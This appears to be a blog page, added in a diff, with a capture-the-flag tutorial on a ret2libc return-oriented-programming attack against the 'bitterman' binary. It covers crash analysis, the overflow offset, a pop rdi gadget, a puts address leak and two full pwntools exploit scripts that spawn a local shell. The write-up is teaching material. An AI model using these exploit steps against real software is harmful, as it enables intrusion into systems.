@@ -1,0 +1,1316 @@
+<!DOCTYPE HTML>
+<html lang="en-EN">
+
+
+<head><meta name="generator" content="Hexo 3.9.0">
+    <meta charset="utf-8">
+    <meta name="keywords" content="ROP - ret2libc attack, D4mianWayne">
+    <meta name="description" content="Pwning Binaries with one goal to be bests">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="renderer" content="webkit|ie-stand|ie-comp">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-144686323-1"></script>
+<script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag() {
+        dataLayer.push(arguments);
+    }
+
+    gtag('js', new Date());
+    gtag('config', 'UA-144686323-1');
+</script>
+
+
+    <title>ROP - ret2libc attack | Pwning 24/7</title>
+    <link rel="icon" type="image/png" href="/favicon.png">
+
+    <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
+    <link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
+    <link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
+    <link rel="stylesheet" type="text/css" href="/css/matery.css">
+    <link rel="stylesheet" type="text/css" href="/css/my.css">
+
+    <script src="/libs/jquery/jquery.min.js"></script>
+
+<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head>
+
+
+<body>
+    <header class="navbar-fixed">
+    <nav id="headNav" class="bg-color nav-transparent">
+        <div id="navContainer" class="nav-wrapper container">
+            <div class="brand-logo">
+                <a href="/" class="waves-effect waves-light">
+                    
+                    <img src="/medias/logo.png" class="logo-img" alt="LOGO">
+                    
+                    <span class="logo-span">Pwning 24/7</span>
+                </a>
+            </div>
+            
+
+<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
+<ul class="right nav-menu">
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/" class="waves-effect waves-light">
+      
+      <i class="fas fa-home" style="zoom: 0.6;"></i>
+      
+      <span>home</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/tags" class="waves-effect waves-light">
+      
+      <i class="fas fa-tags" style="zoom: 0.6;"></i>
+      
+      <span>tags</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/categories" class="waves-effect waves-light">
+      
+      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
+      
+      <span>Categories</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/archives" class="waves-effect waves-light">
+      
+      <i class="fas fa-archive" style="zoom: 0.6;"></i>
+      
+      <span>Archives</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/about" class="waves-effect waves-light">
+      
+      <i class="fas fa-user-circle-o" style="zoom: 0.6;"></i>
+      
+      <span>About</span>
+    </a>
+    
+  </li>
+  
+  <li>
+    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
+      <i id="searchIcon" class="fas fa-search" title="Search" style="zoom: 0.85;"></i>
+    </a>
+  </li>
+</ul>
+
+
+<div id="mobile-nav" class="side-nav sidenav">
+
+    <div class="mobile-head bg-color">
+        
+        <img src="/medias/logo.png" class="logo-img circle responsive-img">
+        
+        <div class="logo-name">Pwning 24/7</div>
+        <div class="logo-desc">
+            
+            Pwning Binaries with one goal to be bests
+            
+        </div>
+    </div>
+
+    
+
+    <ul class="menu-list mobile-menu-list">
+        
+        <li class="m-nav-item">
+	  
+		<a href="/" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-home"></i>
+			
+			home
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/tags" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-tags"></i>
+			
+			tags
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/categories" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-bookmark"></i>
+			
+			Categories
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/archives" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-archive"></i>
+			
+			Archives
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/about" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-user-circle-o"></i>
+			
+			About
+		</a>
+          
+        </li>
+        
+        
+        <li><div class="divider"></div></li>
+        <li>
+            <a href="https://github.com/D4mianWayne" class="waves-effect waves-light" target="_blank">
+                <i class="fab fa-github-square fa-fw"></i>My Github
+            </a>
+        </li>
+        
+    </ul>
+</div>
+
+
+        </div>
+
+        
+            <style>
+    .nav-transparent .github-corner {
+        display: none !important;
+    }
+
+    .github-corner {
+        position: absolute;
+        z-index: 10;
+        top: 0;
+        right: 0;
+        border: 0;
+        transform: scale(1.1);
+    }
+
+    .github-corner svg {
+        color: #0f9d58;
+        fill: #fff;
+        height: 64px;
+        width: 64px;
+    }
+
+    .github-corner:hover .octo-arm {
+        animation: a 0.56s ease-in-out;
+    }
+
+    .github-corner .octo-arm {
+        animation: none;
+    }
+
+    @keyframes a {
+        0%,
+        to {
+            transform: rotate(0);
+        }
+        20%,
+        60% {
+            transform: rotate(-25deg);
+        }
+        40%,
+        80% {
+            transform: rotate(10deg);
+        }
+    }
+</style>
+
+<a href="https://github.com/D4mianWayne" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
+   data-tooltip="My Github" data-position="left" data-delay="50">
+    <svg viewBox="0 0 250 250" aria-hidden="true">
+        <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
+        <path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2"
+              fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path>
+        <path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z"
+              fill="currentColor" class="octo-body"></path>
+    </svg>
+</a>
+        
+    </nav>
+
+</header>
+
+    
+
+
+
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/23.jpg')">
+    <div class="container" style="right: 0px;left: 0px;">
+        <div class="row">
+            <div class="col s12 m12 l12">
+                <div class="brand">
+                    <h1 class="description center-align post-title">ROP - ret2libc attack</h1>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+<main class="post-container content">
+
+    
+    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
+<style>
+    #articleContent h1::before,
+    #articleContent h2::before,
+    #articleContent h3::before,
+    #articleContent h4::before,
+    #articleContent h5::before,
+    #articleContent h6::before {
+        display: block;
+        content: " ";
+        height: 100px;
+        margin-top: -100px;
+        visibility: hidden;
+    }
+
+    #articleContent :focus {
+        outline: none;
+    }
+
+    .toc-fixed {
+        position: fixed;
+        top: 64px;
+    }
+
+    .toc-widget {
+        width: 345px;
+        padding-left: 20px;
+    }
+
+    .toc-widget .toc-title {
+        margin: 35px 0 15px 0;
+        padding-left: 17px;
+        font-size: 1.5rem;
+        font-weight: bold;
+        line-height: 1.5rem;
+    }
+
+    .toc-widget ol {
+        padding: 0;
+        list-style: none;
+    }
+
+    #toc-content {
+        height: calc(100vh - 250px);
+        overflow: auto;
+    }
+
+    #toc-content ol {
+        padding-left: 10px;
+    }
+
+    #toc-content ol li {
+        padding-left: 10px;
+    }
+
+    #toc-content .toc-link:hover {
+        color: #42b983;
+        font-weight: 700;
+        text-decoration: underline;
+    }
+
+    #toc-content .toc-link::before {
+        background-color: transparent;
+        max-height: 25px;
+
+        position: absolute;
+        right: 23.5vw;
+        display: block;
+    }
+
+    .toc-fixed .toc-link::before{
+        position: fixed!important;/*当toc的位置改为fixed时，.toc-link::before也要改为fixed*/
+    }
+
+    #toc-content .is-active-link {
+        color: #42b983;
+    }
+
+    #toc-content .is-active-link::before {
+        background-color: #42b983;
+    }
+
+    #floating-toc-btn {
+        position: fixed;
+        right: 15px;
+        bottom: 76px;
+        padding-top: 15px;
+        margin-bottom: 0;
+        z-index: 998;
+    }
+
+    #floating-toc-btn .btn-floating {
+        width: 48px;
+        height: 48px;
+    }
+
+    #floating-toc-btn .btn-floating i {
+        line-height: 48px;
+        font-size: 1.4rem;
+    }
+</style>
+<div class="row">
+    <div id="main-content" class="col s12 m12 l9">
+        <!-- 文章内容详情 -->
+<div id="artDetail">
+    <div class="card">
+        <div class="card-content article-info">
+            <div class="row tag-cate">
+                <div class="col s7">
+                    
+                    <div class="article-tag">
+                        
+                            <a href="/tags/rop-pwn-ret2libc-bof/">
+                                <span class="chip bg-color">rop, pwn, ret2libc, bof</span>
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+                <div class="col s5 right-align">
+                    
+                    <div class="post-cate">
+                        <i class="fas fa-bookmark fa-fw icon-category"></i>
+                        
+                            <a href="/categories/Return-Oriented-Programming/" class="post-category">
+                                Return Oriented Programming
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+            </div>
+
+            <div class="post-info">
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-minus fa-fw"></i>Publish Date:&nbsp;&nbsp;
+                    2019-07-29
+                </div>
+                
+
+                
+
+                
+                <div class="info-break-policy">
+                    <i class="far fa-file-word fa-fw"></i>Word Count:&nbsp;&nbsp;
+                    2.2k
+                </div>
+                
+
+                
+                <div class="info-break-policy">
+                    <i class="far fa-clock fa-fw"></i>Read Times:&nbsp;&nbsp;
+                    13 Min
+                </div>
+                
+
+                
+                    <div id="busuanzi_container_page_pv" class="info-break-policy">
+                        <i class="far fa-eye fa-fw"></i>Read Count:&nbsp;&nbsp;
+                        <span id="busuanzi_value_page_pv"></span>
+                    </div>
+				
+            </div>
+        </div>
+        <hr class="clearfix">
+        <div class="card-content article-card-content">
+            <div id="articleContent">
+                <p>Today, I will show you how to use Return Oriented Programming for doing a <strong>ret2libc</strong> attack.</p>
+<h1 id="Foreword"><a href="#Foreword" class="headerlink" title="Foreword"></a>Foreword</h1><p>This is much more harder than what we encountered earlier, unlike before we won’t have any function preloaded with strings like <code>/bin/cat flag.txt</code>. It won’t even contain a <code>system</code> so we will use <code>libc.so.6</code> to get the <code>system</code> and <code>/bin/sh</code> address to spawn a shell.</p>
+<h1 id="What-is-Return-to-libc-or-ret2libc-attack"><a href="#What-is-Return-to-libc-or-ret2libc-attack" class="headerlink" title="What is Return-to-libc or ret2libc attack?"></a>What is Return-to-libc or ret2libc attack?</h1><p>A “return-to-libc” attack is a computer security attack usually starting with a buffer overflow in which a subroutine return address on a call stack is replaced by an address of a subroutine that is already present in the process’ executable memory, bypassing the no-execute bit feature (if present) and ridding the attacker of the need to inject their own code.</p>
+<p>Returning to libc is a method of exploiting a buffer overflow on a system that has a non-executable stack, it is very similar to a standard buffer overflow, in that the return address is changed to point at a new location that we can control. However since no executable code is allowed on the stack we can’t just tag in shellcode.   This is the reason we use the return into libc trick and utilize a function provided by the library. We still overwrite the return address with one of a function in libc, pass it the correct arguments and have that execute for us. Since these functions do not reside on the stack, we can bypass the stack protection and execute code.</p>
+<h1 id="Binary-Analysis"><a href="#Binary-Analysis" class="headerlink" title="Binary Analysis"></a>Binary Analysis</h1><p>Let’s try <code>checksec bitterman</code> and see what protections are enabled.</p>
+<pre><code>Arch:     amd64-64-little 
+RELRO:    No RELRO
+Stack:    No canary found 
+NX:       NX enabled 
+PIE:      No PIE</code></pre><p><strong>NX</strong> is enabled that means we have a non executable stack, hence we need a ret2libc attack.Let’s load up the binary into radare2 and start analysing.</p>
+<pre><code> 0x0040077c      bfc9084000     mov edi, str.Please_enter_your_text: ; .//main.c:23 ; 0x4008c9 ; &quot;&gt; Please enter your text: &quot; ; const char * s
+|           0x00400781      e89afdffff     call sym.imp.puts           ; int puts(const char *s)
+|           0x00400786      488b050b0520.  mov rax, qword [obj.stdout] ; loc.stdout ; [0x600c98:8]=0
+|           0x0040078d      4889c7         mov rdi, rax                ; FILE *stream
+|           0x00400790      e8dbfdffff     call sym.imp.fflush         ; int fflush(FILE *stream)
+|           0x00400795      488b9568ffff.  mov rdx, qword [local_98h]  ; .//main.c:24 ; size_t nbyte</code></pre><p>It uses <code>puts</code> that seems vulnerable? Can’t say much without checking. So, let’s use gdb-peda:-</p>
+<pre><code>gdb-peda$ r
+Starting program: /home/robin/ROP-Emporium/bitterman 
+&gt; What&#39;s your name? 
+robin
+Hi, robin
+
+&gt; Please input the length of your message: 
+512
+&gt; Please enter your text:
+**--pattern created--**</code></pre><p>Doing that, we get <strong>Program received signal SIGSEGV, Segmentation fault.</strong>, look like the stack overflowed i.e. a buffer overflow. So, let’s continue analysing the stack and core that has been dumped.</p>
+<pre><code>[----------------------------------registers-----------------------------------]
+RAX: 0x0 
+RBX: 0x0 
+RCX: 0xb40 (&#39;@\x0b&#39;)
+RDX: 0x0 
+RSI: 0x7ffff7dd18c0 --&gt; 0x0 
+RDI: 0x7ffff7dd0760 --&gt; 0xfbad2a84 
+RBP: 0x415341416f414152 (&#39;RAAoAASA&#39;)
+RSP: 0x7fffffffde48 (&quot;ApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA\n8\255?\004\240\034Ґ\005@&quot;)
+RIP: 0x4007e1 (&lt;main+245&gt;:    ret)
+R8 : 0x7ffff7dd18c0 --&gt; 0x0 
+R9 : 0x7ffff7fdc4c0 (0x00007ffff7fdc4c0)
+R10: 0x7ffff7b82cc0 --&gt; 0x2000200020002 
+R11: 0x246 
+R12: 0x400590 (&lt;_start&gt;:    xor    ebp,ebp)
+R13: 0x7fffffffdf20 --&gt; 0x1 
+R14: 0x0 
+R15: 0x0
+EFLAGS: 0x10206 (carry PARITY adjust zero sign trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+   0x4007d6 &lt;main+234&gt;:    call   0x400570 &lt;fflush@plt&gt;
+   0x4007db &lt;main+239&gt;:    mov    eax,0x0
+   0x4007e0 &lt;main+244&gt;:    leave  
+=&gt; 0x4007e1 &lt;main+245&gt;:    ret    
+   0x4007e2:    nop    WORD PTR cs:[rax+rax*1+0x0]
+   0x4007ec:    nop    DWORD PTR [rax+0x0]
+   0x4007f0 &lt;__libc_csu_init&gt;:    push   r15
+   0x4007f2 &lt;__libc_csu_init+2&gt;:    push   r14
+[------------------------------------stack-------------------------------------]
+0000| 0x7fffffffde48 (&quot;ApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA\n8\255?\004\240\034Ґ\005@&quot;)
+0008| 0x7fffffffde50 (&quot;AAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA\n8\255?\004\240\034Ґ\005@&quot;)
+0016| 0x7fffffffde58 (&quot;VAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA\n8\255?\004\240\034Ґ\005@&quot;)
+0024| 0x7fffffffde60 (&quot;AuAAXAAvAAYAAwAAZAAxAAyA\n8\255?\004\240\034Ґ\005@&quot;)
+0032| 0x7fffffffde68 (&quot;AAYAAwAAZAAxAAyA\n8\255?\004\240\034Ґ\005@&quot;)
+0040| 0x7fffffffde70 (&quot;ZAAxAAyA\n8\255?\004\240\034Ґ\005@&quot;)
+0048| 0x7fffffffde78 --&gt; 0xd21ca0043fad380a 
+0056| 0x7fffffffde80 --&gt; 0x400590 (&lt;_start&gt;:    xor    ebp,ebp)
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+Stopped reason: SIGSEGV
+0x00000000004007e1 in main (argc=0x1, argv=0x7fffffffdf28) at main.c:28
+28    main.c: No such file or directory.</code></pre><p>Look, at <strong>RSP</strong> register is full of our pattern, in 64-bit register we cant overwrite <strong>RIP</strong> straight away so let’s see our stack <strong>RSP</strong>, the Stack Pointer points to our input, we need to fix the return address and inject our code but for that we need to know where overflow occurs. Doing similar from what we did earlier let’s get started:-</p>
+<pre><code>gdb-peda$ x/xg $rsp
+0x7fffffffde48:    0x7141415441417041
+gdb-peda$ pattern offset 0x7141415441417041
+8160875829899915329 found at offset: 152</code></pre><ul>
+<li><code>x/xg</code> : This loads the memory address of <strong>RSP</strong> register in hex format and in 64-bit format.</li>
+<li><code>pattern offset &lt; value &gt;</code> : This shows after how many bytes the overflow occured.</li>
+</ul>
+<p>We get the overflow limit i.e. <strong>152</strong>.</p>
+<h1 id="Stage-1-Leaking-the-address"><a href="#Stage-1-Leaking-the-address" class="headerlink" title="Stage 1: Leaking the address"></a>Stage 1: Leaking the address</h1><p>First, as told earlier we need to get <code>put</code> address from the running process. First, we need leak address then we need to get the constant distance which means the offset for it after that we will get to execute our code.</p>
+<p>Let’s get <code>puts</code> using <code>objdump -D bitterman | grep puts</code> :-</p>
+<pre><code>400520:    ff 25 2a 07 20 00        jmpq   *0x20072a(%rip)        # 600c50 &lt;puts@GLIBC_2.2.5&gt;</code></pre><p>As you can see we have one address at the left and one i the right. Let m clarify this:-</p>
+<hr>
+<p>PLT stands for Procedure Linkage Table which is, put simply, used to call external procedures/functions whose address isn’t known in the time of linking, and is left to be resolved by the dynamic linker at run time.<br>GOT stands for Global Offsets Table and is similarly used to resolve addresses.The Global Offset Table (or GOT) is a section inside of programs that holds addresses of functions that are dynamically linked. As mentioned in the page on calling conventions, most programs don’t include every function they use to reduce binary size. Instead, common functions (like those in libc) are “linked” into the program so they can be saved once on disk and reused by every program. </p>
+<hr>
+<p>So, we get the address of <strong>PLT</strong> and <strong>GOT</strong> <code>puts</code> i.e. <code>0x400520</code> and <code>0x600c50</code> respectively.</p>
+<h5 id="The-Gadget"><a href="#The-Gadget" class="headerlink" title="The Gadget"></a>The Gadget</h5><p>For finding a gadget, I will use radare2’s <code>/R &lt; instruction &gt;</code> command to find a <code>pop rdi; ret;</code> gadget.</p>
+<pre><code>[0x00400590]&gt; /R pop rdi
+  0x00400853                 5f  pop rdi
+  0x00400854                 c3  ret</code></pre><p>Let’s copy the address i.e. <code>0x400853</code>.</p>
+<p>Let’s make the exploit:-</p>
+<p>First off, we have <code>pop_rdi</code> gadget address and <strong>PLT</strong> and <strong>GOT</strong> <code>puts</code> address.</p>
+<pre><code>from pwn import * # importing fuctions 
+#context(terminal=[&#39;gnome-terminal&#39;,&#39;new-window&#39;]) Debug purpose
+#context.log_level = &#39;DEBUG&#39; # Debug purpose
+p = process(&#39;./bitterman&#39;) # using bitterman elf # processing the target elf
+#p = gdb.debug(&#39;./bitterman&#39;,&#39;b main&#39;) # breakpoint setup at main via gdb
+plt_put = p64(0x400520) # PLT put address 
+got_put = p64(0x600c50) # GOT put address
+pop_rdi = p64(0x400853) # pop_rdi address
+
+padding = &quot;A&quot;*152 # Because we know the offset from earlier
+
+payload = padding +  pop_rdi + got_put + plt_put 
+
+p.recvuntil(&quot;name?&quot;) # recieve data until we recieve the string
+p.sendline(&quot;robin&quot;)  # send data 
+p.recvuntil(&quot;message:&quot;) # recieve data until we recieve the string
+p.sendline(&quot;1024&quot;) # send data 
+p.recvuntil(&quot;text:&quot;) # recieve data until we recieve the string
+p.sendline(payload) # send data
+p.recvuntil(&quot;Thanks!&quot;) # recieve data until we recieve the string
+leaked_puts = p.recv()[:8].strip().ljust(8,&quot;\x00&quot;) # recieving the string until we get leaked address and padding with null bytes to length of 8
+log.success(&quot;Leaked puts: %s&quot; %(leaked_puts)) # Prints the leaked addresss
+p.interactive() # keeps the shell interactive</code></pre><p>This script pretty much explains everything with comments. So, let’s see what we get after running this:-</p>
+<pre><code>[+] Starting local process &#39;./bitterman&#39;: pid 3117
+[*] &#39;/home/robin/ROP-Emporium/libc.so.6&#39;
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+[+] Leaked puts: ��E\x92\x87\x7f\x00\x00
+[*] Switching to interactive mode</code></pre><p>Great, we now have the leaked address, we need to find the offset which will be constant for every address. So, let’s start carfting our <strong>ret2libc</strong> attack.</p>
+<h1 id="Stage-2-Final-Exploit-using-ret2libc"><a href="#Stage-2-Final-Exploit-using-ret2libc" class="headerlink" title="Stage 2: Final Exploit using ret2libc"></a>Stage 2: Final Exploit using ret2libc</h1><p>So, from the previous exploit we get the leaked address. Now we need to find the offset and execute the <code>/bin/sh</code> to spawn a shell.</p>
+<p>First off, we need <code>main</code> address because the leak address will be changed everytime so we need to get main address so we can use the leaked address to get the offset for current process.<br>Using <code>objdump -D bitterman | grep main</code>, we will grab the address of the bitteman’s <code>main</code>.</p>
+<pre><code>-snip--
+00000000004006ec &lt;main&gt;:
+--snip--</code></pre><p>Nice, we have the main address. Let’s proceed further for crafting the exploit. </p>
+<blockquote>
+<p>Warning: Before we proceeds, we need the <code>libc.so.6</code> of your machine. Copy it with <code>cp //lib/x86_64-linux-gnu/libc.so.6 .</code> , it willcopy the<code>libc.so.6</code> to the working directory.</p>
+</blockquote>
+<p>Now, we will automate the finding of addresses of <code>put</code> and <code>system</code>  with pwntools but beforehand we need <code>/bin/sh</code> address as well. To find that, let’s use strings <code>strings -a -t x libc.so.6 | grep /bin/sh</code> , we will get the address of <code>/bin/sh</code> from the <code>libc.so.6</code>.</p>
+<p>Let’s make the exploit:-</p>
+<pre><code>#!/usr/bin/python
+
+from pwn import * # importing fuctions 
+#context(terminal=[&#39;gnome-terminal&#39;,&#39;new-window&#39;]) Debug purpose
+#context.log_level = &#39;DEBUG&#39; # Debug purpose
+p = process(&#39;./bitterman&#39;) # using bitterman elf # processing the target elf
+#p = gdb.debug(&#39;./bitterman&#39;,&#39;b main&#39;) # breakpoint setup at main via gdb
+libc = ELF(&#39;libc.so.6&#39;)
+plt_put = p64(0x400520) # PLT put address 
+got_put = p64(0x600c50) # GOT put address
+pop_rdi = p64(0x400853) # pop_rdi address
+plt_main = p64(0x4006ec)
+
+padding = &quot;A&quot;*152 # Because we know the offset from earlier
+
+payload = padding +  pop_rdi + got_put + plt_put + plt_main
+
+p.recvuntil(&quot;name?&quot;) # recieve data until we recieve the string
+p.sendline(&quot;robin&quot;)  # send data 
+p.recvuntil(&quot;message:&quot;) # recieve data until we recieve the string
+p.sendline(&quot;1024&quot;) # send data 
+p.recvuntil(&quot;text:&quot;) # recieve data until we recieve the string
+p.sendline(payload) # send data
+p.recvuntil(&quot;Thanks!&quot;) # recieve data until we recieve the string
+leaked_puts = p.recv()[:8].strip().ljust(8,&quot;\x00&quot;) # recieving the string until we get leaked address and padding with null bytes to length of 8
+log.success(&quot;Leaked puts: %s&quot; %(leaked_puts)) # Prints the leaked addresss
+leaked_puts = u64(leaked_puts) # converts to 64-bit friendly integer
+
+
+offset = leaked_puts - libc.symbols[&#39;puts&#39;] # Ths
+sys = p64(offset + libc.symbols[&#39;system&#39;])
+sh = p64(offset + 0x1b3e9a)
+
+payload = padding+ p64(0x0000000000400509) + pop_rdi + sh + sys # remove p64(0x0000000000400509) if you&#39;re not using ubuntu
+p.sendline(&quot;robin&quot;)
+p.recvuntil(&quot;message:&quot;)
+p.sendline(&quot;1024&quot;)
+p.recvuntil(&quot;text:&quot;)
+p.sendline(payload)
+p.recvuntil(&quot;Thanks!&quot;)
+
+
+p.interactive()</code></pre><p><strong>This will spawn a shell and hence you learned how to do a ret2libc attack</strong>.<br>In a nutshell, we used the leak address to find the offset and hence using the gadget we overwrite the instruction pointer while calling the <code>system</code> and <code>/bin/sh</code> hence spawning a shell.</p>
+<pre><code>
+robin@oracle:~/ROP$ python exploit2.py
+[+] Starting local process &#39;./bitterman&#39;: pid 12562
+[*] &#39;/home/robin/ROP-Emporium/libc.so.6&#39;
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+[+] Leaked puts: ��3\x84�\x00
+[*] Switching to interactive mode
+
+$ id
+uid=1000(robin)
+</code></pre><h1 id="Final-Words"><a href="#Final-Words" class="headerlink" title="Final Words"></a>Final Words</h1><p>Thanks to <a href="https://twitter.com/__lord_idiot" target="_blank" rel="noopener">@Lord_Idiot</a> for helping me out with the stack alignment issue.</p>
+<h5 id="The-MOVAPS-issue"><a href="#The-MOVAPS-issue" class="headerlink" title="The MOVAPS issue"></a>The MOVAPS issue</h5><hr>
+<p>If you’re using Ubuntu 18.04 and segfaulting on a movaps instruction in buffered_vfprintf() or do_system() in the 64 bit challenges then ensure the stack is 16 byte aligned before returning to GLIBC functions such as printf() and system(). The version of GLIBC packaged with Ubuntu 18.04 uses movaps instructions to move data onto the stack in some functions. The 64 bit calling convention requires the stack to be 16 byte aligned before a call instruction but this is easily violated during ROP chain execution, causing all further calls from that function to be made with a misaligned stack. movaps triggers a general protection fault when operating on unaligned data, so try padding your ROP chain with an extra ret before returning into a function or return further into a function to skip a push instruction.</p>
+<hr>
+<p>That was it. Until then, <strong>pwn</strong>.</p>
+<h5 id="Files"><a href="#Files" class="headerlink" title="Files"></a>Files</h5><p>Bitterman: <a href="https://github.com/ctfs/write-ups-2015/raw/master/camp-ctf-2015/pwn/bitterman-300/bitterman" target="_blank" rel="noopener">https://github.com/ctfs/write-ups-2015/raw/master/camp-ctf-2015/pwn/bitterman-300/bitterman</a></p>
+
+            </div>
+            <hr/>
+
+            
+
+    <div class="reprint" id="reprint-statement">
+        
+            <div class="reprint__author">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-user">
+                        Author:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="https://d4mianwayne.github.io" rel="external nofollow noreferrer">D4mianwayne</a>
+                </span>
+            </div>
+            <div class="reprint__type">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-link">
+                        Link:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="https://d4mianwayne.github.io/2019/07/29/ret2libc-pwntools/">https://d4mianwayne.github.io/2019/07/29/ret2libc-pwntools/</a>
+                </span>
+            </div>
+            <div class="reprint__notice">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-copyright">
+                        Reprint policy:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    All articles in this blog are used except for special statements
+                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
+                    reprint polocy. If reproduced, please indicate source
+                    <a href="https://d4mianwayne.github.io" target="_blank">D4mianwayne</a>
+                    !
+                </span>
+            </div>
+        
+    </div>
+
+    <script async defer>
+      document.addEventListener("copy", function (e) {
+        let toastHTML = '<span>Copied successfully, please follow the reprint policy of this article</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">more</a>';
+        M.toast({html: toastHTML})
+      });
+
+      function navToReprintStatement() {
+        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
+      }
+    </script>
+
+
+
+            <div class="tag_share" style="display: block;">
+                <div class="post-meta__tag-list" style="display: inline-block;">
+                    
+                        <div class="article-tag">
+                            
+                                <a href="/tags/rop-pwn-ret2libc-bof/">
+                                    <span class="chip bg-color">rop, pwn, ret2libc, bof</span>
+                                </a>
+                            
+                        </div>
+                    
+                </div>
+                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
+                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
+<div id="article-share">
+
+    
+    <div class="social-share" data-sites="qq,qzone,wechat,weibo,douban,twitter" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
+    <script src="/libs/share/js/social-share.min.js"></script>
+    
+
+    
+
+</div>
+
+                </div>
+            </div>
+            
+                <style>
+    #reward {
+        margin: 40px 0;
+        text-align: center;
+    }
+
+    #reward .reward-link {
+        font-size: 1.4rem;
+        line-height: 38px;
+    }
+
+    #reward .btn-floating:hover {
+        box-shadow: 0 6px 12px rgba(0, 0, 0, 0.2), 0 5px 15px rgba(0, 0, 0, 0.2);
+    }
+
+    #rewardModal {
+        width: 320px;
+        height: 350px;
+    }
+
+    #rewardModal .reward-title {
+        margin: 15px auto;
+        padding-bottom: 5px;
+    }
+
+    #rewardModal .modal-content {
+        padding: 10px;
+    }
+
+    #rewardModal .close {
+        position: absolute;
+        right: 15px;
+        top: 15px;
+        color: rgba(0, 0, 0, 0.5);
+        font-size: 1.3rem;
+        line-height: 20px;
+        cursor: pointer;
+    }
+
+    #rewardModal .close:hover {
+        color: #ef5350;
+        transform: scale(1.3);
+        -moz-transform:scale(1.3);
